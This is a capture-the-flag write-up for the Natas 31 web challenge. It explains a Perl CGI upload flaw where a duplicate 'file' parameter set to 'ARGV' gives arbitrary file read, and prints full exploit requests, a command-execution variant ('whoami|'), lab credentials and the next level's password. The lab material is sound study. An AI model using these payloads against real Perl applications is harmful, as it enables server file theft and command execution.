Another Perl spelunking bug that I would have never figured out by myself.

The page allows us to upload a .csv file, then it formats it in a nice table layout. Here is a sample request when submitting the page:
```
POST /index.pl HTTP/1.1
Host: natas31.natas.labs.overthewire.org
Content-Length: 291
Cache-Control: max-age=0
Authorization: Basic bmF0YXMzMTpBTVpGMTR5a25PbjlVYzU3dUtCMDJqbll1aHBsWWthMw==
Upgrade-Insecure-Requests: 1
Origin: http://natas31.natas.labs.overthewire.org
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary2ZpcnEVkbjBpA2Ai
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://natas31.natas.labs.overthewire.org/index.pl
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

------WebKitFormBoundary2ZpcnEVkbjBpA2Ai
Content-Disposition: form-data; name="file"; filename="test.csv"
Content-Type: text/csv

foo,bar
1,2

------WebKitFormBoundary2ZpcnEVkbjBpA2Ai
Content-Disposition: form-data; name="submit"

Upload
------WebKitFormBoundary2ZpcnEVkbjBpA2Ai--
```

We have access to the source code again, the interesting part checks if an upload is present then reads the file and prints it out nicely:
```
my $cgi = CGI->new;
if ($cgi->upload('file')) {
    my $file = $cgi->param('file');
    print '<table class="sortable table table-hover table-striped">';
    $i=0;
    while (<$file>) {
        my @elements=split /,/, $_;

        if($i==0){ # header
            print "<tr>";
            foreach(@elements){
                print "<th>".$cgi->escapeHTML($_)."</th>";   
            }
            print "</tr>";
        }
        else{ # table content
            print "<tr>";
            foreach(@elements){
                print "<td>".$cgi->escapeHTML($_)."</td>";   
            }
            print "</tr>";
        }
        $i+=1;
    }
    print '</table>';
}
else{
print
```

I found a web [page](https://metacpan.org/pod/CGI#Processing-a-file-upload-field) that says that `$cgi->param('file')` should return the upload filename, so my first attempt was to modify the `filename` attribute in the `Content-Disposition` header, but no luck.

So I read a write-up which points at an old [presentation](https://www.blackhat.com/docs/asia-16/materials/asia-16-Rubin-The-Perl-Jam-2-The-Camel-Strikes-Back.pdf). First:
- `$cgi->upload('file')` returns True is one of the parameters named `file` is a file upload
- `$cgi->param('file')` returns a list of all the parameters named `file`
- `my $file = $cgi->param('file');` assigns only the first value to `$file` (I guess due to the Perl scalar context, the list is converted to a single value).

So by sending a request with a multi-part body with two `file` parameters, where the first one is a string and the second a file upload. We can pass the upload check and assign a string value to `$file` instead of a file descriptor.

Next hurdle: `<$file>` doesn't work if `$file` is a string, unless it is the string "ARGV". In that case the `<>` operator loops through the script argument and insert each one in an `open()` call.

So we get an arbitrary file read:
```
POST /index.pl?/etc/natas_webpass/natas32 HTTP/1.1
Host: natas31.natas.labs.overthewire.org
Content-Length: 386
Cache-Control: max-age=0
Authorization: Basic bmF0YXMzMTpBTVpGMTR5a25PbjlVYzU3dUtCMDJqbll1aHBsWWthMw==
Upgrade-Insecure-Requests: 1
Origin: http://natas31.natas.labs.overthewire.org
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary2ZpcnEVkbjBpA2Ai
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://natas31.natas.labs.overthewire.org/index.pl
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

------WebKitFormBoundary2ZpcnEVkbjBpA2Ai
Content-Disposition: form-data; name="file"

ARGV
------WebKitFormBoundary2ZpcnEVkbjBpA2Ai
Content-Disposition: form-data; name="file"; filename="test.csv"
Content-Type: text/csv

foo,bar
1,2

------WebKitFormBoundary2ZpcnEVkbjBpA2Ai
Content-Disposition: form-data; name="submit"

Upload
------WebKitFormBoundary2ZpcnEVkbjBpA2Ai--
```

And the password for the next level is `NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B`.

**Notes:** 
- it's also possible to execute arbitrary code on the server using a pipe at the end of the payload, as in `POST /index.pl?whoami|`
- actually the write-up I checked out executes a cat command instead of just reading the target file.

**Bonus**
To host Perl CGI scripts with Apache, use the following configuration:
```
<VirtualHost *:80>
	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/html

	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined

	<Files ~ "\.(pl|cgi)$">
		AddHandler cgi-script .cgi .pl
		Options +ExecCGI
	</Files>
</VirtualHost>
```
